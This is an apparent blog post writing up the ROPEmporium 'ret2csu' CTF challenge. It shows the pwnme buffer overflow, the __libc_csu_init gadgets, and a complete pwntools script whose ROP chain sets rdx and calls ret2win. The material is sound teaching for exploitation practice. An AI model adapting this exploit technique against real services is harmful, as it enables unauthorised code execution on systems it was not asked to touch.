---
layout: post
title:  "ret2csu ROPEmporium"
date:   2020-08-24
categories: ctf
description: Ret2csu ROP
tags: ctf-writeup
---

## Intro

you can download challenge binary [here](https://ropemporium.com/challenge/ret2csu.html), in this challenge
we have to deal with ret2csu technique in order to solve this challnge, you can read more about ret2csu [here](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf)
there is a talk on blackhat asia 2018 about this technique 

[![IMAGE ALT TEXT](http://img.youtube.com/vi/mPbHroMVepM/0.jpg)](http://www.youtube.com/watch?v=mPbHroMVepM "Video Title")

## Reverse Engineering

Information about the elf:

    ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
    dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
    for GNU/Linux 3.2.0, BuildID[sha1]=a799b370a24ba0109f1175f31b3058094b5feab5, 
    not stripped

Binary Protection: 

<img src="/images/ret2csu/protection.png" />

The `main` function is just look simple, puts a string and then call other function called `pwnme`

<img src="/images/ret2csu/main.png" />

the `pwnme` function also looks simple, just puts a few strings, and it will wait for user input 

<img src="/images/ret2csu/pwnme.png" />

we have buffer overflow inside `pwnme` function

<img src="/images/ret2csu/disas_pwnme.png" />


our goals to get the flag, we have to call `ret2win` function, 
and set `%rdx` register to `0xdeadcafebabebeef`

<img src="/images/ret2csu/ret2win.png" />



## Exploitation

in order to perform ret2csu technique, we have to look at the `__libc_csu_init` function, we can use `0x040089a` 
to pop everything we need

<img src="/images/ret2csu/gadget1.png" />

and we need another gadget from `__libc_csu_init` function, `0x0400880` to set `%r15` register that we can control from
previous gadget to `%rdx` register

<img src="/images/ret2csu/movrdx.png" />

but we have some problem here, we have to deal with 

    00400889  call    qword [r12+rbx*8]

and, we have to set our `%rbp` to `1` so we can pass this test

    0040088d  add     rbx, 0x1
    00400891  cmp     rbp, rbx
    00400894  jne     0x400880

Luckily, we can controll the value of `%rbx` and `%rbp` from our first gadget, we can set 
`%rbp` to `1` so that after `add     rbx, 0x1` they will be equal. 
to avoid sigsev from `call    qword [r12+rbx*8]` we need a pointer to a function, 
and the pointer should point to a function that will not change our `%rdx` register, after the function 
being called we can just call `ret2win` to get the flag, we can use `_init` function because this 
function will not change our `%rdx` register

<img src="/images/ret2csu/init.png" />

and this function also have a pointer

<img src="/images/ret2csu/pointer_init.png">

so we can set `%r12` register to `0x600e38` and then, jump to `ret2win` function
to get the flag, now let's write some python code

{% highlight python %}
#!/usr/bin/env python2
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("./ret2csu")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    # attach(r)
    rop_csu = 0x040089A
    ret2csu = 0x0400880
    ret2win = 0x04007B1 

    init_pointer = 0x0600E38

    # ret2csu
    p = ''
    p += p.ljust(40, "a")    
    p += p64(rop_csu)
    p += p64(0) # rbx
    p += p64(1) # rbp
    p += p64(init_pointer) # r12
    p += p64(0) # r13 
    p += p64(0) # r14
    p += p64(0xdeadcafebabebeef) # r15
    p += p64(ret2csu)
    p += p64(0) * 7
    p += p64(ret2win)

    r.sendlineafter("\n>",p)

    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("127.0.0.1", 1337)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)

{% endhighlight %}

and run the code

<img src="/images/ret2csu/flag.png"/>

nice, we got the flag.